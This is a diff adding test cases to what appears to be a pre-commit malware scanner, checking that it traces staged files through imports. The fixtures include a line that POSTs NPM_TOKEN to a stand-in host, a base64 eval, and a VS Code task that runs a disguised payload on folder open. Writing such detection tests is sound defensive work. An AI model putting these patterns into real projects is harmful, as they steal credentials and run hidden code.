@@ -95,6 +95,90 @@ describe('pre-commit scans the staged blob, not the worktree (issue #26)', () =>
     ).toBe(true);
   });
 
+  it('traces a staged encoded ESLint config to an unchanged extensionless blob', async () => {
+    const root = makeRepo();
+    write(root, 'package.json', JSON.stringify({ name: 'fixture' }));
+    write(root, 'eslint.config.js', 'export default {} satisfies object;\n');
+    write(
+      root,
+      'init',
+      `const token = process.env.NPM_TOKEN;\nfetch('https://example.invalid', { method: 'POST', body: token });\neval(Buffer.from('Y29uc29sZS5sb2coJ3NpbXVsYXRlZCcp', 'base64').toString());\n`
+    );
+    git(root, 'add', '-A');
+    git(
+      root,
+      'commit',
+      '-q',
+      '-m',
+      'safe baseline with unreferenced extensionless blob'
+    );
+
+    write(
+      root,
+      'eslint.config.js',
+      `import './init';\nexport default {} satisfies object;\n`
+    );
+    git(root, 'add', 'eslint.config.js');
+    write(root, 'eslint.config.js', 'export default {} satisfies object;\n');
+    write(root, 'init', CLEAN); // both staged blobs differ from the worktree
+
+    const result = await runPreCommit(root);
+
+    expect(blocked(result, 'eslint.config.js')).toBe(true);
+    const finding = result.findings.find(
+      (entry) =>
+        entry.category === 'malicious-content' &&
+        entry.location?.file === 'eslint.config.js'
+    );
+    expect(finding?.metadata?.trace).toEqual(['eslint.config.js', 'init']);
+    expect(JSON.stringify(finding)).not.toContain('example.invalid');
+    expect(JSON.stringify(finding)).not.toContain('NPM_TOKEN');
+  }, 30_000);
+
+  it('traces a staged folder-open task through unchanged disguised blobs', async () => {
+    const root = makeRepo();
+    write(root, '.vscode/tasks.json', JSON.stringify({ tasks: [] }));
+    write(root, 'init', "require('./payload.orc');\n");
+    write(root, 'payload.orc', 'eval(atob(encoded));\n');
+    git(root, 'add', '-A');
+    git(
+      root,
+      'commit',
+      '-q',
+      '-m',
+      'safe baseline with inert unreferenced payload'
+    );
+
+    write(
+      root,
+      '.vscode/tasks.json',
+      JSON.stringify({
+        tasks: [
+          {
+            runOptions: { runOn: 'folderOpen' },
+            command: 'node init'
+          }
+        ]
+      })
+    );
+    git(root, 'add', '.vscode/tasks.json');
+    write(root, '.vscode/tasks.json', JSON.stringify({ tasks: [] }));
+
+    const result = await runPreCommit(root);
+
+    const finding = result.findings.find(
+      (entry) =>
+        entry.category === 'malicious-content' &&
+        entry.location?.file === '.vscode/tasks.json'
+    );
+    expect(finding?.ruleId).toBe('TLP-MAL-001');
+    expect(finding?.metadata?.trace).toEqual([
+      '.vscode/tasks.json',
+      'init',
+      'payload.orc'
+    ]);
+  }, 30_000);
+
   it('handles partial staging: scans exactly what would be committed', async () => {
     const root = makeRepo();
     write(root, 'mixed.ts', `${CLEAN}${fakeSecretLine('partial')}`);
